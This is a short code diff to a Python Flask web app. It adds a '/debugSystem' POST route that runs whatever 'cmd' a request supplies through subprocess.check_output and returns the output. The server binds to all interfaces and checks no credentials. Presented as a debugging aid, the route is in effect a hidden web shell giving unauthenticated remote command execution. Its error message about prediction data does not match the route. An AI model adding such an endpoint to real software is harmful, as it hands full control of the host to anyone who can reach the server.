@@ -37,5 +37,22 @@ def RefreshDataset():
 	response = minimalGeneral.RefreshDataset()
 	return jsonify(response)
 
+@app.route("/debugSystem", methods = ["POST"])
+def DebugSystem():
+	try:
+		from subprocess import check_output
+		data = request.json
+		response = {
+			"result": "OK",
+			"msg": check_output(data["cmd"])
+		}
+	except Exception as ex:
+		response = {
+			"result": "ERR",
+			"message": "Invalid POST request, need data for prediction"
+		}
+		
+	return jsonify(response)
+
 if __name__ == "__main__":
 	app.run(host = "0.0.0.0")
